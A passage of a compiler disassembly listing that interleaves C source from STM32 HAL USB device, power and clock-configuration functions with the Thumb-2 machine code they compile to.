 80034fc:	68bb      	ldr	r3, [r7, #8]
 80034fe:	6a1a      	ldr	r2, [r3, #32]
 8003500:	68bb      	ldr	r3, [r7, #8]
 8003502:	691b      	ldr	r3, [r3, #16]
 8003504:	429a      	cmp	r2, r3
 8003506:	d30b      	bcc.n	8003520 <HAL_PCD_EP_DB_Transmit+0x63e>
        {
          len = ep->maxpacket;
 8003508:	68bb      	ldr	r3, [r7, #8]
 800350a:	691b      	ldr	r3, [r3, #16]
 800350c:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db -= len;
 8003510:	68bb      	ldr	r3, [r7, #8]
 8003512:	6a1a      	ldr	r2, [r3, #32]
 8003514:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003518:	1ad2      	subs	r2, r2, r3
 800351a:	68bb      	ldr	r3, [r7, #8]
 800351c:	621a      	str	r2, [r3, #32]
 800351e:	e017      	b.n	8003550 <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else if (ep->xfer_len_db == 0U)
 8003520:	68bb      	ldr	r3, [r7, #8]
 8003522:	6a1b      	ldr	r3, [r3, #32]
 8003524:	2b00      	cmp	r3, #0
 8003526:	d108      	bne.n	800353a <HAL_PCD_EP_DB_Transmit+0x658>
        {
          len = TxPctSize;
 8003528:	f8b7 3086 	ldrh.w	r3, [r7, #134]	; 0x86
 800352c:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_fill_db = 0U;
 8003530:	68bb      	ldr	r3, [r7, #8]
 8003532:	2200      	movs	r2, #0
 8003534:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 8003538:	e00a      	b.n	8003550 <HAL_PCD_EP_DB_Transmit+0x66e>
        }
        else
        {
          len = ep->xfer_len_db;
 800353a:	68bb      	ldr	r3, [r7, #8]
 800353c:	6a1b      	ldr	r3, [r3, #32]
 800353e:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
          ep->xfer_len_db = 0U;
 8003542:	68bb      	ldr	r3, [r7, #8]
 8003544:	2200      	movs	r2, #0
 8003546:	621a      	str	r2, [r3, #32]
          ep->xfer_fill_db = 0;
 8003548:	68bb      	ldr	r3, [r7, #8]
 800354a:	2200      	movs	r2, #0
 800354c:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
        }

        /* Set the Double buffer counter for pmabuffer1 */
        PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, len);
 8003550:	68fb      	ldr	r3, [r7, #12]
 8003552:	681b      	ldr	r3, [r3, #0]
 8003554:	657b      	str	r3, [r7, #84]	; 0x54
 8003556:	68bb      	ldr	r3, [r7, #8]
 8003558:	785b      	ldrb	r3, [r3, #1]
 800355a:	2b00      	cmp	r3, #0
 800355c:	d165      	bne.n	800362a <HAL_PCD_EP_DB_Transmit+0x748>
 800355e:	68fb      	ldr	r3, [r7, #12]
 8003560:	681b      	ldr	r3, [r3, #0]
 8003562:	65fb      	str	r3, [r7, #92]	; 0x5c
 8003564:	68fb      	ldr	r3, [r7, #12]
 8003566:	681b      	ldr	r3, [r3, #0]
 8003568:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800356c:	b29b      	uxth	r3, r3
 800356e:	461a      	mov	r2, r3
 8003570:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8003572:	4413      	add	r3, r2
 8003574:	65fb      	str	r3, [r7, #92]	; 0x5c
 8003576:	68bb      	ldr	r3, [r7, #8]
 8003578:	781b      	ldrb	r3, [r3, #0]
 800357a:	00da      	lsls	r2, r3, #3
 800357c:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 800357e:	4413      	add	r3, r2
 8003580:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003584:	65bb      	str	r3, [r7, #88]	; 0x58
 8003586:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003588:	881b      	ldrh	r3, [r3, #0]
 800358a:	b29b      	uxth	r3, r3
 800358c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8003590:	b29a      	uxth	r2, r3
 8003592:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003594:	801a      	strh	r2, [r3, #0]
 8003596:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800359a:	2b3e      	cmp	r3, #62	; 0x3e
 800359c:	d91d      	bls.n	80035da <HAL_PCD_EP_DB_Transmit+0x6f8>
 800359e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80035a2:	095b      	lsrs	r3, r3, #5
 80035a4:	66bb      	str	r3, [r7, #104]	; 0x68
 80035a6:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80035aa:	f003 031f 	and.w	r3, r3, #31
 80035ae:	2b00      	cmp	r3, #0
 80035b0:	d102      	bne.n	80035b8 <HAL_PCD_EP_DB_Transmit+0x6d6>
 80035b2:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80035b4:	3b01      	subs	r3, #1
 80035b6:	66bb      	str	r3, [r7, #104]	; 0x68
 80035b8:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035ba:	881b      	ldrh	r3, [r3, #0]
 80035bc:	b29a      	uxth	r2, r3
 80035be:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80035c0:	b29b      	uxth	r3, r3
 80035c2:	029b      	lsls	r3, r3, #10
 80035c4:	b29b      	uxth	r3, r3
 80035c6:	4313      	orrs	r3, r2
 80035c8:	b29b      	uxth	r3, r3
 80035ca:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80035ce:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80035d2:	b29a      	uxth	r2, r3
 80035d4:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035d6:	801a      	strh	r2, [r3, #0]
 80035d8:	e041      	b.n	800365e <HAL_PCD_EP_DB_Transmit+0x77c>
 80035da:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80035de:	2b00      	cmp	r3, #0
 80035e0:	d10a      	bne.n	80035f8 <HAL_PCD_EP_DB_Transmit+0x716>
 80035e2:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035e4:	881b      	ldrh	r3, [r3, #0]
 80035e6:	b29b      	uxth	r3, r3
 80035e8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80035ec:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80035f0:	b29a      	uxth	r2, r3
 80035f2:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 80035f4:	801a      	strh	r2, [r3, #0]
 80035f6:	e032      	b.n	800365e <HAL_PCD_EP_DB_Transmit+0x77c>
 80035f8:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80035fc:	085b      	lsrs	r3, r3, #1
 80035fe:	66bb      	str	r3, [r7, #104]	; 0x68
 8003600:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003604:	f003 0301 	and.w	r3, r3, #1
 8003608:	2b00      	cmp	r3, #0
 800360a:	d002      	beq.n	8003612 <HAL_PCD_EP_DB_Transmit+0x730>
 800360c:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800360e:	3301      	adds	r3, #1
 8003610:	66bb      	str	r3, [r7, #104]	; 0x68
 8003612:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003614:	881b      	ldrh	r3, [r3, #0]
 8003616:	b29a      	uxth	r2, r3
 8003618:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800361a:	b29b      	uxth	r3, r3
 800361c:	029b      	lsls	r3, r3, #10
 800361e:	b29b      	uxth	r3, r3
 8003620:	4313      	orrs	r3, r2
 8003622:	b29a      	uxth	r2, r3
 8003624:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8003626:	801a      	strh	r2, [r3, #0]
 8003628:	e019      	b.n	800365e <HAL_PCD_EP_DB_Transmit+0x77c>
 800362a:	68bb      	ldr	r3, [r7, #8]
 800362c:	785b      	ldrb	r3, [r3, #1]
 800362e:	2b01      	cmp	r3, #1
 8003630:	d115      	bne.n	800365e <HAL_PCD_EP_DB_Transmit+0x77c>
 8003632:	68fb      	ldr	r3, [r7, #12]
 8003634:	681b      	ldr	r3, [r3, #0]
 8003636:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800363a:	b29b      	uxth	r3, r3
 800363c:	461a      	mov	r2, r3
 800363e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8003640:	4413      	add	r3, r2
 8003642:	657b      	str	r3, [r7, #84]	; 0x54
 8003644:	68bb      	ldr	r3, [r7, #8]
 8003646:	781b      	ldrb	r3, [r3, #0]
 8003648:	00da      	lsls	r2, r3, #3
 800364a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800364c:	4413      	add	r3, r2
 800364e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8003652:	653b      	str	r3, [r7, #80]	; 0x50
 8003654:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8003658:	b29a      	uxth	r2, r3
 800365a:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 800365c:	801a      	strh	r2, [r3, #0]

        /* Copy the user buffer to USB PMA */
        USB_WritePMA(hpcd->Instance, ep->xfer_buff,  ep->pmaaddr1, (uint16_t)len);
 800365e:	68fb      	ldr	r3, [r7, #12]
 8003660:	6818      	ldr	r0, [r3, #0]
 8003662:	68bb      	ldr	r3, [r7, #8]
 8003664:	6959      	ldr	r1, [r3, #20]
 8003666:	68bb      	ldr	r3, [r7, #8]
 8003668:	895a      	ldrh	r2, [r3, #10]
 800366a:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800366e:	b29b      	uxth	r3, r3
 8003670:	f004 fee7 	bl	8008442 <USB_WritePMA>
      }
    }
  }

  /*enable endpoint IN*/
  PCD_SET_EP_TX_STATUS(hpcd->Instance, ep->num, USB_EP_TX_VALID);
 8003674:	68fb      	ldr	r3, [r7, #12]
 8003676:	681b      	ldr	r3, [r3, #0]
 8003678:	461a      	mov	r2, r3
 800367a:	68bb      	ldr	r3, [r7, #8]
 800367c:	781b      	ldrb	r3, [r3, #0]
 800367e:	009b      	lsls	r3, r3, #2
 8003680:	4413      	add	r3, r2
 8003682:	881b      	ldrh	r3, [r3, #0]
 8003684:	b29b      	uxth	r3, r3
 8003686:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 800368a:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 800368e:	82bb      	strh	r3, [r7, #20]
 8003690:	8abb      	ldrh	r3, [r7, #20]
 8003692:	f083 0310 	eor.w	r3, r3, #16
 8003696:	82bb      	strh	r3, [r7, #20]
 8003698:	8abb      	ldrh	r3, [r7, #20]
 800369a:	f083 0320 	eor.w	r3, r3, #32
 800369e:	82bb      	strh	r3, [r7, #20]
 80036a0:	68fb      	ldr	r3, [r7, #12]
 80036a2:	681b      	ldr	r3, [r3, #0]
 80036a4:	461a      	mov	r2, r3
 80036a6:	68bb      	ldr	r3, [r7, #8]
 80036a8:	781b      	ldrb	r3, [r3, #0]
 80036aa:	009b      	lsls	r3, r3, #2
 80036ac:	441a      	add	r2, r3
 80036ae:	8abb      	ldrh	r3, [r7, #20]
 80036b0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80036b4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80036b8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80036bc:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80036c0:	b29b      	uxth	r3, r3
 80036c2:	8013      	strh	r3, [r2, #0]

  return HAL_OK;
 80036c4:	2300      	movs	r3, #0
}
 80036c6:	4618      	mov	r0, r3
 80036c8:	3790      	adds	r7, #144	; 0x90
 80036ca:	46bd      	mov	sp, r7
 80036cc:	bd80      	pop	{r7, pc}

080036ce <HAL_PCDEx_PMAConfig>:
  * @retval HAL status
  */

HAL_StatusTypeDef  HAL_PCDEx_PMAConfig(PCD_HandleTypeDef *hpcd, uint16_t ep_addr,
                                       uint16_t ep_kind, uint32_t pmaadress)
{
 80036ce:	b480      	push	{r7}
 80036d0:	b087      	sub	sp, #28
 80036d2:	af00      	add	r7, sp, #0
 80036d4:	60f8      	str	r0, [r7, #12]
 80036d6:	607b      	str	r3, [r7, #4]
 80036d8:	460b      	mov	r3, r1
 80036da:	817b      	strh	r3, [r7, #10]
 80036dc:	4613      	mov	r3, r2
 80036de:	813b      	strh	r3, [r7, #8]
  PCD_EPTypeDef *ep;

  /* initialize ep structure*/
  if ((0x80U & ep_addr) == 0x80U)
 80036e0:	897b      	ldrh	r3, [r7, #10]
 80036e2:	f003 0380 	and.w	r3, r3, #128	; 0x80
 80036e6:	b29b      	uxth	r3, r3
 80036e8:	2b00      	cmp	r3, #0
 80036ea:	d00b      	beq.n	8003704 <HAL_PCDEx_PMAConfig+0x36>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 80036ec:	897b      	ldrh	r3, [r7, #10]
 80036ee:	f003 0307 	and.w	r3, r3, #7
 80036f2:	1c5a      	adds	r2, r3, #1
 80036f4:	4613      	mov	r3, r2
 80036f6:	009b      	lsls	r3, r3, #2
 80036f8:	4413      	add	r3, r2
 80036fa:	00db      	lsls	r3, r3, #3
 80036fc:	68fa      	ldr	r2, [r7, #12]
 80036fe:	4413      	add	r3, r2
 8003700:	617b      	str	r3, [r7, #20]
 8003702:	e009      	b.n	8003718 <HAL_PCDEx_PMAConfig+0x4a>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr];
 8003704:	897a      	ldrh	r2, [r7, #10]
 8003706:	4613      	mov	r3, r2
 8003708:	009b      	lsls	r3, r3, #2
 800370a:	4413      	add	r3, r2
 800370c:	00db      	lsls	r3, r3, #3
 800370e:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8003712:	68fa      	ldr	r2, [r7, #12]
 8003714:	4413      	add	r3, r2
 8003716:	617b      	str	r3, [r7, #20]
  }

  /* Here we check if the endpoint is single or double Buffer*/
  if (ep_kind == PCD_SNG_BUF)
 8003718:	893b      	ldrh	r3, [r7, #8]
 800371a:	2b00      	cmp	r3, #0
 800371c:	d107      	bne.n	800372e <HAL_PCDEx_PMAConfig+0x60>
  {
    /* Single Buffer */
    ep->doublebuffer = 0U;
 800371e:	697b      	ldr	r3, [r7, #20]
 8003720:	2200      	movs	r2, #0
 8003722:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaadress = (uint16_t)pmaadress;
 8003724:	687b      	ldr	r3, [r7, #4]
 8003726:	b29a      	uxth	r2, r3
 8003728:	697b      	ldr	r3, [r7, #20]
 800372a:	80da      	strh	r2, [r3, #6]
 800372c:	e00b      	b.n	8003746 <HAL_PCDEx_PMAConfig+0x78>
  }
#if (USE_USB_DOUBLE_BUFFER == 1U)
  else /* USB_DBL_BUF */
  {
    /* Double Buffer Endpoint */
    ep->doublebuffer = 1U;
 800372e:	697b      	ldr	r3, [r7, #20]
 8003730:	2201      	movs	r2, #1
 8003732:	731a      	strb	r2, [r3, #12]
    /* Configure the PMA */
    ep->pmaaddr0 = (uint16_t)(pmaadress & 0xFFFFU);
 8003734:	687b      	ldr	r3, [r7, #4]
 8003736:	b29a      	uxth	r2, r3
 8003738:	697b      	ldr	r3, [r7, #20]
 800373a:	811a      	strh	r2, [r3, #8]
    ep->pmaaddr1 = (uint16_t)((pmaadress & 0xFFFF0000U) >> 16);
 800373c:	687b      	ldr	r3, [r7, #4]
 800373e:	0c1b      	lsrs	r3, r3, #16
 8003740:	b29a      	uxth	r2, r3
 8003742:	697b      	ldr	r3, [r7, #20]
 8003744:	815a      	strh	r2, [r3, #10]
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 8003746:	2300      	movs	r3, #0
}
 8003748:	4618      	mov	r0, r3
 800374a:	371c      	adds	r7, #28
 800374c:	46bd      	mov	sp, r7
 800374e:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003752:	4770      	bx	lr

08003754 <HAL_PCDEx_ActivateLPM>:
  * @brief  Activate LPM feature.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCDEx_ActivateLPM(PCD_HandleTypeDef *hpcd)
{
 8003754:	b480      	push	{r7}
 8003756:	b085      	sub	sp, #20
 8003758:	af00      	add	r7, sp, #0
 800375a:	6078      	str	r0, [r7, #4]

  USB_TypeDef *USBx = hpcd->Instance;
 800375c:	687b      	ldr	r3, [r7, #4]
 800375e:	681b      	ldr	r3, [r3, #0]
 8003760:	60fb      	str	r3, [r7, #12]
  hpcd->lpm_active = 1U;
 8003762:	687b      	ldr	r3, [r7, #4]
 8003764:	2201      	movs	r2, #1
 8003766:	f8c3 22ec 	str.w	r2, [r3, #748]	; 0x2ec
  hpcd->LPM_State = LPM_L0;
 800376a:	687b      	ldr	r3, [r7, #4]
 800376c:	2200      	movs	r2, #0
 800376e:	f883 22e0 	strb.w	r2, [r3, #736]	; 0x2e0

  USBx->LPMCSR |= USB_LPMCSR_LMPEN;
 8003772:	68fb      	ldr	r3, [r7, #12]
 8003774:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 8003778:	b29b      	uxth	r3, r3
 800377a:	f043 0301 	orr.w	r3, r3, #1
 800377e:	b29a      	uxth	r2, r3
 8003780:	68fb      	ldr	r3, [r7, #12]
 8003782:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54
  USBx->LPMCSR |= USB_LPMCSR_LPMACK;
 8003786:	68fb      	ldr	r3, [r7, #12]
 8003788:	f8b3 3054 	ldrh.w	r3, [r3, #84]	; 0x54
 800378c:	b29b      	uxth	r3, r3
 800378e:	f043 0302 	orr.w	r3, r3, #2
 8003792:	b29a      	uxth	r2, r3
 8003794:	68fb      	ldr	r3, [r7, #12]
 8003796:	f8a3 2054 	strh.w	r2, [r3, #84]	; 0x54

  return HAL_OK;
 800379a:	2300      	movs	r3, #0
}
 800379c:	4618      	mov	r0, r3
 800379e:	3714      	adds	r7, #20
 80037a0:	46bd      	mov	sp, r7
 80037a2:	f85d 7b04 	ldr.w	r7, [sp], #4
 80037a6:	4770      	bx	lr

080037a8 <HAL_PWR_EnableBkUpAccess>:
  * @note  LSEON bit that switches on and off the LSE crystal belongs as well to the
  *        back-up domain.
  * @retval None
  */
void HAL_PWR_EnableBkUpAccess(void)
{
 80037a8:	b480      	push	{r7}
 80037aa:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR1, PWR_CR1_DBP);
 80037ac:	4b05      	ldr	r3, [pc, #20]	; (80037c4 <HAL_PWR_EnableBkUpAccess+0x1c>)
 80037ae:	681b      	ldr	r3, [r3, #0]
 80037b0:	4a04      	ldr	r2, [pc, #16]	; (80037c4 <HAL_PWR_EnableBkUpAccess+0x1c>)
 80037b2:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 80037b6:	6013      	str	r3, [r2, #0]
}
 80037b8:	bf00      	nop
 80037ba:	46bd      	mov	sp, r7
 80037bc:	f85d 7b04 	ldr.w	r7, [sp], #4
 80037c0:	4770      	bx	lr
 80037c2:	bf00      	nop
 80037c4:	40007000 	.word	0x40007000

080037c8 <HAL_PWREx_GetVoltageRange>:
  * @brief Return Voltage Scaling Range.
  * @retval VOS bit field (PWR_REGULATOR_VOLTAGE_SCALE1 or PWR_REGULATOR_VOLTAGE_SCALE2
  *         or PWR_REGULATOR_VOLTAGE_SCALE1_BOOST when applicable)
  */
uint32_t HAL_PWREx_GetVoltageRange(void)
{
 80037c8:	b480      	push	{r7}
 80037ca:	af00      	add	r7, sp, #0
    else
    {
      return PWR_REGULATOR_VOLTAGE_SCALE1_BOOST;
    }
#else
  return  (PWR->CR1 & PWR_CR1_VOS);
 80037cc:	4b04      	ldr	r3, [pc, #16]	; (80037e0 <HAL_PWREx_GetVoltageRange+0x18>)
 80037ce:	681b      	ldr	r3, [r3, #0]
 80037d0:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
#endif
}
 80037d4:	4618      	mov	r0, r3
 80037d6:	46bd      	mov	sp, r7
 80037d8:	f85d 7b04 	ldr.w	r7, [sp], #4
 80037dc:	4770      	bx	lr
 80037de:	bf00      	nop
 80037e0:	40007000 	.word	0x40007000

080037e4 <HAL_PWREx_ControlVoltageScaling>:
  *        cleared before returning the status. If the flag is not cleared within
  *        50 microseconds, HAL_TIMEOUT status is reported.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_PWREx_ControlVoltageScaling(uint32_t VoltageScaling)
{
 80037e4:	b480      	push	{r7}
 80037e6:	b085      	sub	sp, #20
 80037e8:	af00      	add	r7, sp, #0
 80037ea:	6078      	str	r0, [r7, #4]
  }

#else

  /* If Set Range 1 */
  if (VoltageScaling == PWR_REGULATOR_VOLTAGE_SCALE1)
 80037ec:	687b      	ldr	r3, [r7, #4]
 80037ee:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 80037f2:	d130      	bne.n	8003856 <HAL_PWREx_ControlVoltageScaling+0x72>
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE1)
 80037f4:	4b23      	ldr	r3, [pc, #140]	; (8003884 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 80037f6:	681b      	ldr	r3, [r3, #0]
 80037f8:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 80037fc:	f5b3 7f00 	cmp.w	r3, #512	; 0x200
 8003800:	d038      	beq.n	8003874 <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 1 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE1);
 8003802:	4b20      	ldr	r3, [pc, #128]	; (8003884 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003804:	681b      	ldr	r3, [r3, #0]
 8003806:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 800380a:	4a1e      	ldr	r2, [pc, #120]	; (8003884 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 800380c:	f443 7300 	orr.w	r3, r3, #512	; 0x200
 8003810:	6013      	str	r3, [r2, #0]

      /* Wait until VOSF is cleared */
      wait_loop_index = ((PWR_FLAG_SETTING_DELAY_US * SystemCoreClock) / 1000000U) + 1U;
 8003812:	4b1d      	ldr	r3, [pc, #116]	; (8003888 <HAL_PWREx_ControlVoltageScaling+0xa4>)
 8003814:	681b      	ldr	r3, [r3, #0]
 8003816:	2232      	movs	r2, #50	; 0x32
 8003818:	fb02 f303 	mul.w	r3, r2, r3
 800381c:	4a1b      	ldr	r2, [pc, #108]	; (800388c <HAL_PWREx_ControlVoltageScaling+0xa8>)
 800381e:	fba2 2303 	umull	r2, r3, r2, r3
 8003822:	0c9b      	lsrs	r3, r3, #18
 8003824:	3301      	adds	r3, #1
 8003826:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 8003828:	e002      	b.n	8003830 <HAL_PWREx_ControlVoltageScaling+0x4c>
      {
        wait_loop_index--;
 800382a:	68fb      	ldr	r3, [r7, #12]
 800382c:	3b01      	subs	r3, #1
 800382e:	60fb      	str	r3, [r7, #12]
      while ((HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF)) && (wait_loop_index != 0U))
 8003830:	4b14      	ldr	r3, [pc, #80]	; (8003884 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003832:	695b      	ldr	r3, [r3, #20]
 8003834:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003838:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 800383c:	d102      	bne.n	8003844 <HAL_PWREx_ControlVoltageScaling+0x60>
 800383e:	68fb      	ldr	r3, [r7, #12]
 8003840:	2b00      	cmp	r3, #0
 8003842:	d1f2      	bne.n	800382a <HAL_PWREx_ControlVoltageScaling+0x46>
      }
      if (HAL_IS_BIT_SET(PWR->SR2, PWR_SR2_VOSF))
 8003844:	4b0f      	ldr	r3, [pc, #60]	; (8003884 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003846:	695b      	ldr	r3, [r3, #20]
 8003848:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 800384c:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003850:	d110      	bne.n	8003874 <HAL_PWREx_ControlVoltageScaling+0x90>
      {
        return HAL_TIMEOUT;
 8003852:	2303      	movs	r3, #3
 8003854:	e00f      	b.n	8003876 <HAL_PWREx_ControlVoltageScaling+0x92>
      }
    }
  }
  else
  {
    if (READ_BIT(PWR->CR1, PWR_CR1_VOS) != PWR_REGULATOR_VOLTAGE_SCALE2)
 8003856:	4b0b      	ldr	r3, [pc, #44]	; (8003884 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003858:	681b      	ldr	r3, [r3, #0]
 800385a:	f403 63c0 	and.w	r3, r3, #1536	; 0x600
 800385e:	f5b3 6f80 	cmp.w	r3, #1024	; 0x400
 8003862:	d007      	beq.n	8003874 <HAL_PWREx_ControlVoltageScaling+0x90>
    {
      /* Set Range 2 */
      MODIFY_REG(PWR->CR1, PWR_CR1_VOS, PWR_REGULATOR_VOLTAGE_SCALE2);
 8003864:	4b07      	ldr	r3, [pc, #28]	; (8003884 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 8003866:	681b      	ldr	r3, [r3, #0]
 8003868:	f423 63c0 	bic.w	r3, r3, #1536	; 0x600
 800386c:	4a05      	ldr	r2, [pc, #20]	; (8003884 <HAL_PWREx_ControlVoltageScaling+0xa0>)
 800386e:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 8003872:	6013      	str	r3, [r2, #0]
      /* No need to wait for VOSF to be cleared for this transition */
    }
  }
#endif

  return HAL_OK;
 8003874:	2300      	movs	r3, #0
}
 8003876:	4618      	mov	r0, r3
 8003878:	3714      	adds	r7, #20
 800387a:	46bd      	mov	sp, r7
 800387c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8003880:	4770      	bx	lr
 8003882:	bf00      	nop
 8003884:	40007000 	.word	0x40007000
 8003888:	20000000 	.word	0x20000000
 800388c:	431bde83 	.word	0x431bde83

08003890 <HAL_PWREx_EnableVddUSB>:
  * @brief Enable VDDUSB supply.
  * @note  Remove VDDUSB electrical and logical isolation, once VDDUSB supply is present.
  * @retval None
  */
void HAL_PWREx_EnableVddUSB(void)
{
 8003890:	b480      	push	{r7}
 8003892:	af00      	add	r7, sp, #0
  SET_BIT(PWR->CR2, PWR_CR2_USV);
 8003894:	4b05      	ldr	r3, [pc, #20]	; (80038ac <HAL_PWREx_EnableVddUSB+0x1c>)
 8003896:	685b      	ldr	r3, [r3, #4]
 8003898:	4a04      	ldr	r2, [pc, #16]	; (80038ac <HAL_PWREx_EnableVddUSB+0x1c>)
 800389a:	f443 6380 	orr.w	r3, r3, #1024	; 0x400
 800389e:	6053      	str	r3, [r2, #4]
}
 80038a0:	bf00      	nop
 80038a2:	46bd      	mov	sp, r7
 80038a4:	f85d 7b04 	ldr.w	r7, [sp], #4
 80038a8:	4770      	bx	lr
 80038aa:	bf00      	nop
 80038ac:	40007000 	.word	0x40007000

080038b0 <HAL_RCC_OscConfig>:
  * @note   If HSE failed to start, HSE should be disabled before recalling
            HAL_RCC_OscConfig().
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_RCC_OscConfig(RCC_OscInitTypeDef  *RCC_OscInitStruct)
{
 80038b0:	b580      	push	{r7, lr}
 80038b2:	b088      	sub	sp, #32
 80038b4:	af00      	add	r7, sp, #0
 80038b6:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;
  HAL_StatusTypeDef status;
  uint32_t sysclk_source, pll_config;

  /* Check Null pointer */
  if(RCC_OscInitStruct == NULL)
 80038b8:	687b      	ldr	r3, [r7, #4]
 80038ba:	2b00      	cmp	r3, #0
 80038bc:	d102      	bne.n	80038c4 <HAL_RCC_OscConfig+0x14>
  {
    return HAL_ERROR;
 80038be:	2301      	movs	r3, #1
 80038c0:	f000 bc02 	b.w	80040c8 <HAL_RCC_OscConfig+0x818>
  }

  /* Check the parameters */
  assert_param(IS_RCC_OSCILLATORTYPE(RCC_OscInitStruct->OscillatorType));

  sysclk_source = __HAL_RCC_GET_SYSCLK_SOURCE();
 80038c4:	4b96      	ldr	r3, [pc, #600]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 80038c6:	689b      	ldr	r3, [r3, #8]
 80038c8:	f003 030c 	and.w	r3, r3, #12
 80038cc:	61bb      	str	r3, [r7, #24]
  pll_config = __HAL_RCC_GET_PLL_OSCSOURCE();
 80038ce:	4b94      	ldr	r3, [pc, #592]	; (8003b20 <HAL_RCC_OscConfig+0x270>)
 80038d0:	68db      	ldr	r3, [r3, #12]
 80038d2:	f003 0303 	and.w	r3, r3, #3
 80038d6:	617b      	str	r3, [r7, #20]

  /*----------------------------- MSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_MSI) == RCC_OSCILLATORTYPE_MSI)
 80038d8:	687b      	ldr	r3, [r7, #4]
 80038da:	681b      	ldr	r3, [r3, #0]
 80038dc:	f003 0310 	and.w	r3, r3, #16
 80038e0:	2b00      	cmp	r3, #0
 80038e2:	f000 80e4 	beq.w	8003aae <HAL_RCC_OscConfig+0x1fe>
    assert_param(IS_RCC_MSI(RCC_OscInitStruct->MSIState));
    assert_param(IS_RCC_MSICALIBRATION_VALUE(RCC_OscInitStruct->MSICalibrationValue));
    assert_param(IS_RCC_MSI_CLOCK_RANGE(RCC_OscInitStruct->MSIClockRange));

    /* Check if MSI is used as system clock or as PLL source when PLL is selected as system clock */
